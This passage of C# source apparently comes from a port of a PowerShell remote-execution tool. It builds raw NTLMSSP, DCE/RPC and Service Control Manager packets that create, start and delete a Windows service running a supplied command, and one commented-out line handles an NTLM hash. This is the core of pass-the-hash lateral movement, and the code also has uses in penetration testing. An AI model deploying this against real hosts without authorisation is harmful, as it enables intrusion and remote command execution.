            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_CallingWorkstationName",new byte[] {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00});

            if(packet_version != null)
            {
                packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_Version", packet_version);
            }

            return packet_NTLMSSPNegotiate;


        }
        private static OrderedDictionary GetPacketNTLMSSPAuth(byte[] packet_NTLM_response)
        {


            byte[] packet_NTLMSSP_length = BitConverter.GetBytes(packet_NTLM_response.Length);
            packet_NTLMSSP_length = new byte[] { packet_NTLMSSP_length[1], packet_NTLMSSP_length[0] };
            byte[] packet_ASN_length_1 = BitConverter.GetBytes(packet_NTLM_response.Length + 12);
            byte[] packet_ASN_length_1_2 = { packet_ASN_length_1[1], packet_ASN_length_1[0] };
            byte[] packet_ASN_length_2 = BitConverter.GetBytes(packet_NTLM_response.Length + 8);
            byte[] packet_ASN_length_2_2 = { packet_ASN_length_2[1], packet_ASN_length_2[0] };
            byte[] packet_ASN_length_3 = BitConverter.GetBytes(packet_NTLM_response.Length + 4);
            byte[] packet_ASN_length_3_2 = { packet_ASN_length_3[1], packet_ASN_length_3[0]};



            OrderedDictionary packet_NTLMSSPAuth = new OrderedDictionary();
            packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID",new byte[] {0xa1,0x82});
            packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength", packet_ASN_length_1_2);
            packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID2",new byte[] {0x30,0x82});
            packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength2", packet_ASN_length_2_2);
            packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID3",new byte[] {0xa2,0x82});
            packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength3", packet_ASN_length_3_2);
            packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMSSPID",new byte[] {0x04,0x82});
            packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMSSPLength", packet_NTLMSSP_length);
            packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMResponse", packet_NTLM_response);

            return packet_NTLMSSPAuth;
        
        }
        private static OrderedDictionary GetPacketRPCBind(int packet_call_ID, byte[] packet_max_frag, byte[] packet_num_ctx_items, byte[] packet_context_ID, byte[] packet_UUID, byte[] packet_UUID_version)
        {
        
            byte[] packet_call_ID_bytes = BitConverter.GetBytes(packet_call_ID);

            OrderedDictionary packet_RPCBind = new OrderedDictionary();
            packet_RPCBind.Add("RPCBind_Version",new byte[] {0x05});
            packet_RPCBind.Add("RPCBind_VersionMinor",new byte[] {0x00});
            packet_RPCBind.Add("RPCBind_PacketType",new byte[] {0x0b});
            packet_RPCBind.Add("RPCBind_PacketFlags",new byte[] {0x03});
            packet_RPCBind.Add("RPCBind_DataRepresentation",new byte[] {0x10,0x00,0x00,0x00});
            packet_RPCBind.Add("RPCBind_FragLength",new byte[] {0x48,0x00});
            packet_RPCBind.Add("RPCBind_AuthLength",new byte[] {0x00,0x00});
            packet_RPCBind.Add("RPCBind_CallID", packet_call_ID_bytes);
            packet_RPCBind.Add("RPCBind_MaxXmitFrag",new byte[] {0xb8,0x10});
            packet_RPCBind.Add("RPCBind_MaxRecvFrag",new byte[] {0xb8,0x10});
            packet_RPCBind.Add("RPCBind_AssocGroup",new byte[] {0x00,0x00,0x00,0x00});
            packet_RPCBind.Add("RPCBind_NumCtxItems", packet_num_ctx_items);
            packet_RPCBind.Add("RPCBind_Unknown",new byte[] {0x00,0x00,0x00});
            packet_RPCBind.Add("RPCBind_ContextID", packet_context_ID);
            packet_RPCBind.Add("RPCBind_NumTransItems",new byte[] {0x01});
            packet_RPCBind.Add("RPCBind_Unknown2",new byte[] {0x00});
            packet_RPCBind.Add("RPCBind_Interface", packet_UUID);
            packet_RPCBind.Add("RPCBind_InterfaceVer", packet_UUID_version);
            packet_RPCBind.Add("RPCBind_InterfaceVerMinor",new byte[] {0x00,0x00});
            packet_RPCBind.Add("RPCBind_TransferSyntax",new byte[] {0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60});
            packet_RPCBind.Add("RPCBind_TransferSyntaxVer",new byte[] {0x02,0x00,0x00,0x00});


            if(packet_num_ctx_items[0] == 2)
            {
                packet_RPCBind.Add("RPCBind_ContextID2",new byte[] {0x01,0x00});
                packet_RPCBind.Add("RPCBind_NumTransItems2",new byte[] {0x01});
                packet_RPCBind.Add("RPCBind_Unknown3",new byte[] {0x00});
                packet_RPCBind.Add("RPCBind_Interface2",new byte[] {0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a});
                packet_RPCBind.Add("RPCBind_InterfaceVer2",new byte[] {0x00,0x00});
                packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",new byte[] {0x00,0x00});
                packet_RPCBind.Add("RPCBind_TransferSyntax2",new byte[] {0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00});
                packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",new byte[] {0x01,0x00,0x00,0x00});
            }
            else if(packet_num_ctx_items[0] == 3)
            {
                packet_RPCBind.Add("RPCBind_ContextID2",new byte[] {0x01,0x00});
                packet_RPCBind.Add("RPCBind_NumTransItems2",new byte[] {0x01});
                packet_RPCBind.Add("RPCBind_Unknown3",new byte[] {0x00});
                packet_RPCBind.Add("RPCBind_Interface2",new byte[] {0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46});
                packet_RPCBind.Add("RPCBind_InterfaceVer2",new byte[] {0x00,0x00});
                packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",new byte[] {0x00,0x00});
                packet_RPCBind.Add("RPCBind_TransferSyntax2",new byte[] {0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36});
                packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",new byte[] {0x01,0x00,0x00,0x00});
                packet_RPCBind.Add("RPCBind_ContextID3",new byte[] {0x02,0x00});
                packet_RPCBind.Add("RPCBind_NumTransItems3",new byte[] {0x01});
                packet_RPCBind.Add("RPCBind_Unknown4",new byte[] {0x00});
                packet_RPCBind.Add("RPCBind_Interface3",new byte[] {0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46});
                packet_RPCBind.Add("RPCBind_InterfaceVer3",new byte[] {0x00,0x00});
                packet_RPCBind.Add("RPCBind_InterfaceVerMinor3",new byte[] {0x00,0x00});
                packet_RPCBind.Add("RPCBind_TransferSyntax3",new byte[] {0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00});
                packet_RPCBind.Add("RPCBind_TransferSyntaxVer3",new byte[] {0x01,0x00,0x00,0x00});
                packet_RPCBind.Add("RPCBind_AuthType",new byte[] {0x0a});
                packet_RPCBind.Add("RPCBind_AuthLevel",new byte[] {0x04});
                packet_RPCBind.Add("RPCBind_AuthPadLength",new byte[] {0x00});
                packet_RPCBind.Add("RPCBind_AuthReserved",new byte[] {0x00});
                packet_RPCBind.Add("RPCBind_ContextID4",new byte[] {0x00,0x00,0x00,0x00});
                packet_RPCBind.Add("RPCBind_Identifier",new byte[] {0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00});
                packet_RPCBind.Add("RPCBind_MessageType",new byte[] {0x01,0x00,0x00,0x00});
                packet_RPCBind.Add("RPCBind_NegotiateFlags",new byte[] {0x97,0x82,0x08,0xe2});
                packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",new byte[] {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00});
                packet_RPCBind.Add("RPCBind_CallingWorkstationName",new byte[] {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00});
                packet_RPCBind.Add("RPCBind_OSVersion",new byte[] {0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f});
            }

            if(packet_call_ID == 3)
            {
                packet_RPCBind.Add("RPCBind_AuthType",new byte[] {0x0a});
                packet_RPCBind.Add("RPCBind_AuthLevel",new byte[] {0x02});
                packet_RPCBind.Add("RPCBind_AuthPadLength",new byte[] {0x00});
                packet_RPCBind.Add("RPCBind_AuthReserved",new byte[] {0x00});
                packet_RPCBind.Add("RPCBind_ContextID3",new byte[] {0x00,0x00,0x00,0x00});
                packet_RPCBind.Add("RPCBind_Identifier",new byte[] {0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00});
                packet_RPCBind.Add("RPCBind_MessageType",new byte[] {0x01,0x00,0x00,0x00});
                packet_RPCBind.Add("RPCBind_NegotiateFlags",new byte[] {0x97,0x82,0x08,0xe2});
                packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",new byte[] {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00});
                packet_RPCBind.Add("RPCBind_CallingWorkstationName",new byte[] {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00});
                packet_RPCBind.Add("RPCBind_OSVersion",new byte[] {0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f});
            }

            return packet_RPCBind;
        }

        private static OrderedDictionary GetPacketRPCRequest(byte[] packet_flags, int packet_service_length, int packet_auth_length, int packet_auth_padding, byte[] packet_call_ID, byte[] packet_context_ID, byte[] packet_opnum, byte[] packet_data)
        {
            int packet_full_auth_length;
            byte[] packet_write_length;
            byte[] packet_alloc_hint;
            if (packet_auth_length > 0)
            {
                packet_full_auth_length = packet_auth_length + packet_auth_padding + 8;
            }
            else
            {
                packet_full_auth_length = 0;
            }


            if(packet_data != null)
            {
                packet_write_length = BitConverter.GetBytes(packet_service_length + 24 + packet_full_auth_length + packet_data.Length);
                packet_alloc_hint = BitConverter.GetBytes(packet_service_length + packet_data.Length);
            }
            else
            {
                //Doing this because sometimes he calls it with 7 params instead of 8, which Powershell outputs the length to 0.
                packet_write_length = BitConverter.GetBytes(packet_service_length + 24 + packet_full_auth_length);
                packet_alloc_hint = BitConverter.GetBytes(packet_service_length);
                
            }

            byte[] packet_frag_length = { packet_write_length[0], packet_write_length[1] };
            byte[] packet_auth_length2 = BitConverter.GetBytes(packet_auth_length);
            byte[] packet_auth_length3 = {packet_auth_length2[0], packet_auth_length2[1]};

            OrderedDictionary packet_RPCRequest = new OrderedDictionary();
            packet_RPCRequest.Add("RPCRequest_Version",new byte[] {0x05});
            packet_RPCRequest.Add("RPCRequest_VersionMinor",new byte[] {0x00});
            packet_RPCRequest.Add("RPCRequest_PacketType",new byte[] {0x00});
            packet_RPCRequest.Add("RPCRequest_PacketFlags", packet_flags);
            packet_RPCRequest.Add("RPCRequest_DataRepresentation",new byte[] {0x10,0x00,0x00,0x00});
            packet_RPCRequest.Add("RPCRequest_FragLength", packet_frag_length);
            packet_RPCRequest.Add("RPCRequest_AuthLength", packet_auth_length3);
            packet_RPCRequest.Add("RPCRequest_CallID", packet_call_ID);
            packet_RPCRequest.Add("RPCRequest_AllocHint", packet_alloc_hint);
            packet_RPCRequest.Add("RPCRequest_ContextID", packet_context_ID);
            packet_RPCRequest.Add("RPCRequest_Opnum", packet_opnum);

            if(packet_data != null && packet_data.Length > 0)
             {
                packet_RPCRequest.Add("RPCRequest_Data", packet_data);
             }

            return packet_RPCRequest;

        }

        private static OrderedDictionary GetPacketSCMOpenSCManagerW(byte[] packet_service, byte[] packet_service_length)
        {
            byte[] packet_write_length = BitConverter.GetBytes(packet_service.Length + 92);
            byte[] packet_frag_length = { packet_write_length[0], packet_write_length[1] };
            byte[] packet_alloc_hint = BitConverter.GetBytes(packet_service.Length + 68);



            //Generate 2 random numbers as a string (probably in hex format)
            //I hope these were generated correctly >.>
            //string hash2 = "";
            //for (int i = 0; i < hash.Length - 1; i += 2) { hash2 += (hash.Substring(i, 2) + "-"); };
            //byte[] NTLM_hash_bytes = (StringToByteArray(hash.Replace("-", "")));
            Random r = new Random();
            byte[] packet_referent_init = new byte[2];
            r.NextBytes(packet_referent_init);
            byte[] nulls = { 0x00, 0x00 };
            byte[] packet_referent_ID1 = CombineByteArray(packet_referent_init, nulls);
            byte[] packet_referent_init2 = new byte[2];
            r.NextBytes(packet_referent_init2);
            byte[] packet_referent_ID2 = CombineByteArray(packet_referent_init2, nulls);


            OrderedDictionary packet_SCMOpenSCManagerW = new OrderedDictionary();
            packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_ReferentID",packet_referent_ID1);
            packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_MaxCount",packet_service_length);
            packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_Offset",new byte[] {0x00,0x00,0x00,0x00});
            packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_ActualCount",packet_service_length);
            packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName",packet_service);
            packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_ReferentID",packet_referent_ID2);
            packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameMaxCount",new byte[] {0x0f,0x00,0x00,0x00});
            packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameOffset",new byte[] {0x00,0x00,0x00,0x00});
            packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameActualCount",new byte[] {0x0f,0x00,0x00,0x00});
            packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database",new byte[] {0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00});
            packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Unknown",new byte[] {0xbf,0xbf});
            packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_AccessMask",new byte[] {0x3f,0x00,0x00,0x00});
    
            return packet_SCMOpenSCManagerW;
        }

        private static OrderedDictionary GetPacketSCMCreateServiceW(byte[] packet_context_handle, byte[] packet_service, byte[] packet_service_length, byte[] packet_command, byte[] packet_command_length)
        {
            Random r = new Random();
            byte[] packet_referent_init = new byte[2];
            r.NextBytes(packet_referent_init);
            byte[] nulls = { 0x00, 0x00 };
            byte[] packet_referent_ID = new byte[4];
            Buffer.BlockCopy(packet_referent_init, 0, packet_referent_ID, 0, packet_referent_init.Length);
            Buffer.BlockCopy(nulls, 0, packet_referent_ID, packet_referent_init.Length, nulls.Length);

            OrderedDictionary packet_SCMCreateServiceW = new OrderedDictionary();
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_ContextHandle",packet_context_handle);
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_MaxCount",packet_service_length);
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_Offset",new byte[] {0x00,0x00,0x00,0x00});
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_ActualCount",packet_service_length);
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName",packet_service);
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_ReferentID",packet_referent_ID);
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_MaxCount",packet_service_length);
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_Offset",new byte[] {0x00,0x00,0x00,0x00});
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_ActualCount",packet_service_length);
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName",packet_service);
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_AccessMask",new byte[] {0xff,0x01,0x0f,0x00});
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceType",new byte[] {0x10,0x00,0x00,0x00});
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceStartType",new byte[] {0x03,0x00,0x00,0x00});
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceErrorControl",new byte[] {0x00,0x00,0x00,0x00});
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_MaxCount",packet_command_length);
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_Offset",new byte[] {0x00,0x00,0x00,0x00});
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_ActualCount",packet_command_length);
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName",packet_command);
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer",new byte[] {0x00,0x00,0x00,0x00});
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_TagID",new byte[] {0x00,0x00,0x00,0x00});
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer2",new byte[] {0x00,0x00,0x00,0x00});
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_DependSize",new byte[] {0x00,0x00,0x00,0x00});
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer3",new byte[] {0x00,0x00,0x00,0x00});
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer4",new byte[] {0x00,0x00,0x00,0x00});
            packet_SCMCreateServiceW.Add("SCMCreateServiceW_PasswordSize",new byte[] {0x00,0x00,0x00,0x00});

            return packet_SCMCreateServiceW;
        }

        private static OrderedDictionary GetPacketSCMStartServiceW(byte[] packet_context_handle)
        {
            OrderedDictionary packet_SCMStartServiceW = new OrderedDictionary();
            packet_SCMStartServiceW.Add("SCMStartServiceW_ContextHandle", packet_context_handle);
            packet_SCMStartServiceW.Add("SCMStartServiceW_Unknown",new byte[] {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00});
            return packet_SCMStartServiceW;
        }
        private static OrderedDictionary GetPacketSCMDeleteServiceW(byte[] packet_context_handle)
        {
            OrderedDictionary packet_SCMDeleteServiceW = new OrderedDictionary();
            packet_SCMDeleteServiceW.Add("SCMDeleteServiceW_ContextHandle", packet_context_handle);

            return packet_SCMDeleteServiceW;
        }
        private static OrderedDictionary GetPacketSCMCloseServiceHandle(byte[] packet_context_handle)
        {
            OrderedDictionary packet_SCM_CloseServiceW = new OrderedDictionary();
            packet_SCM_CloseServiceW.Add("SCMCloseServiceW_ContextHandle", packet_context_handle);

            return packet_SCM_CloseServiceW;
        }

        private static ushort DataLength2(int length_start, byte[] string_extract_data)
        {
            byte[] bytes = { string_extract_data[length_start], string_extract_data[length_start + 1] };
            ushort string_length = BitConverter.ToUInt16(bytes, 0);
            //string_length = ConvertToUint16(array[arraystart to arraystart +1

            return string_length;
        }
    }
}
